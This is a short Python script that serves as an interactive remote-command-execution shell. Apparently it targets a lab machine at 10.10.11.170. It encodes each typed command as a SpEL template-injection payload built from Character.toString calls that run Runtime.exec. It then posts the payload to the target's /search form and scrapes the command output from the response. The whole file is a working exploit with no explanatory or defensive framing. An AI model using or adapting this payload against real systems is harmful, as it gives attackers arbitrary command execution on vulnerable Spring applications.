import requests
from cmd import Cmd
from bs4 import BeautifulSoup


class RCE(Cmd):
    prompt = "rps> "

    def decimal_encode(self, command):
        decimals = [str(ord(i)) for i in command]

        payload = (
            """*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)"""
            % decimals[0]
        )

        for i in decimals[1:]:
            line = ".concat(T(java.lang.Character).toString({}))".format(i)
            payload += line

        payload += ").getInputStream())}"
        return payload

    def send_payload(self, encoded_command):
        data = {"name": encoded_command}
        r = requests.post("http://10.10.11.170:8080/search", data=data)
        parser = BeautifulSoup(r.content, "html.parser")
        captured_output = parser.find_all("h2", class_="searched")[0].get_text()
        final_output = captured_output.replace("You searched for: ", "").strip()
        return final_output

    def default(self, command):
        encoded_command = self.decimal_encode(command)
        output = self.send_payload(encoded_command)
        print(output, end="\n\n")


RCE().cmdloop()
